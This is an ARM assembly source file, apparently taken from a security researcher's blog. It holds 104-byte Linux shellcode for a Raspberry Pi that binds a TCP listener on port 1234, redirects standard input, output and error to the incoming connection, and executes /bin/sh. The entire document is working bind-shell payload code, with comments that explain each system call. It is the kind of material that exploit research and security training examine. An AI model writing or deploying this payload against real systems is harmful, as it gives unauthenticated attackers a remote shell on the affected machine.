/**
  bind shell to port 1234
  tested with linux running on raspberry pi 3  
  executes in read-only memory
  
  http://modexp.wordpress.com/   
*/
    // 104 bytes
    
    .arch armv6
    .global _start
    .text

_start:
    .code 32
    ldr    r4, =#0xD204FF02 // htons(1234), AF_INET
    ldr    r5, =#0x6e69622f // /bin
    ldr    r6, =#0x68732f2f // //sh
    
    // switch to thumb mode
    add    r3, pc, #1
    bx     r3 
  
    .code 16
    // s = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
    eor    r2, r2, r2   // r2 = IPPROTO_IP
    mov    r1, #1       // r1 = SOCK_STREAM
    lsl    r7, r1, #8   // r7 = 1*256
    add    r7, #25      // r7 = 281 = socket 
    mov    r0, #2       // r0 = AF_INET
    svc    1
    
    mov    r8, r0       // r8 = s
    
    // bind(s, &sa, sizeof(sa)); 
    mov    r1, r4 
    push   {r1, r2}     // save sa on stack
    mov    r1, sp       // r1 = &sa
    strb   r2, [r1, #1] // null the 0xFF in sa.family 
    mov    r2, #16      // sizeof(sa) 
    add    r7, #1       // r7 = 281+1 = 282 = bind
    svc    1
  
    // listen(s, 1);
    mov    r1, #1       // r1 = 1    
    mov    r0, r8       // r0 = s
    add    r7, #2       // r7 = 282+2 = 284 = listen 
    svc    1    
    
    // r = accept(s, 0, 0);
    eor    r2, r2, r2   // r2 = 0
    eor    r1, r1, r1   // r1 = 0
    mov    r0, r8       // r0 = s
    add    r7, #1       // r7 = 284+1 = 285 = accept    
    svc    1    
    
    mov    r8, r0       // r8 = r
    
    // dup2(r, FILENO_STDIN);
    // dup2(r, FILENO_STDOUT);
    // dup2(r, FILENO_STDERR);
    mov    r1, #3       // for 3 descriptors
c_dup:
    mov    r7, #63      // r7 = dup2 
    mov    r0, r8       // r0 = r
    sub    r1, #1 
    svc    1
    bne    c_dup        // while (r1 != 0)

    // execve("/bin/sh", NULL, NULL);
    mov    r7, r2 
    push   {r5, r6, r7}    
    mov    r0, sp       // r0 = "/bin/sh" 
    mov    r7, #11      // r7 = execve
    svc    1
    nop
